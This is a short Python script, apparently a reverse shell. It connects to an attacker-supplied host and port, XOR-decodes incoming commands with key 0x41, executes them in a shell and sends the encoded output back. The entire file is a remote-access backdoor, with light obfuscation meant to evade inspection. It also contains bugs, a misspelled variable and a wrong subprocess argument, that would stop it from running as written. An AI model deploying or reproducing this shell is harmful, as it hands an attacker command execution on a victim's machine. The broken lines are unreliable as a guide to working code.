#!/usr/bin/python

import socket, subprocess, sys

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

while True:
    # receive XOR encoded data from network socket
    data = s.recv(1024)

    # XOR the data again with a '\x41' to get it back to normal
    en_data = bytearray(data)
    for i in range(len(en_date)):
        en_data[i] ^=0x41

    # Execute the decoded data as a command.
    # Subprocess modules allows PIPE STDOUT/STDERR/STDIN to a variable
    comm = subprocess.Popen(str(en_data), shell=True, std=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    STDOUT, STDERR = comm.communicate()

    # Encode the output and send to RHOST
    en_STDOUT = bytearray(STDOUT)
    for i in range(len(en_STDOUT)):
        en_STDOUT[i] ^=0x41
    s.send(en_STDOUT)
s.close()
